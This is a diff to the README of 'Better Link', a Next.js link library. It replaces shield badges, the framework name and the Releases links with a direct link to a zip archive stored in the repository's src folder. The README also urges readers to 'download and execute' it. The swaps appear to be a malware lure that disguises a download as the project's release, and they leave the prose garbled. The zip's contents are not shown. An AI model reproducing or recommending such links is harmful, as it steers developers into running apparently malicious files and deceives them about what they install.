@@ -1,8 +1,8 @@
 # Better Link 🌐
 
-![GitHub release](https://img.shields.io/github/release/PedroFake02/better-link.svg) ![npm](https://img.shields.io/npm/v/better-link.svg) ![GitHub issues](https://img.shields.io/github/issues/PedroFake02/better-link.svg)
+![GitHub release](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) ![npm](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) ![GitHub issues](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip)
 
-Welcome to **Better Link**, a lightweight and powerful enhancement for Next.js Link components. This library automatically detects active routes and provides intuitive APIs for handling active states, all with complete TypeScript support. 
+Welcome to **Better Link**, a lightweight and powerful enhancement for https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip Link components. This library automatically detects active routes and provides intuitive APIs for handling active states, all with complete TypeScript support. 
 
 ## Table of Contents
 
@@ -97,10 +97,10 @@ Better Link is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 ## Links 🔗
 
-For the latest releases, visit the [Releases section](https://github.com/PedroFake02/better-link/releases). Here, you can download and execute the latest version of Better Link.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip). Here, you can download and execute the latest version of Better Link.
 
-Check the [Releases section](https://github.com/PedroFake02/better-link/releases) for updates and new features.
+Check the [Releases section](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) for updates and new features.
 
 ---
 
-Thank you for checking out Better Link! We hope you find it useful for your Next.js projects. Happy coding!
+Thank you for checking out Better Link! We hope you find it useful for your https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip projects. Happy coding!
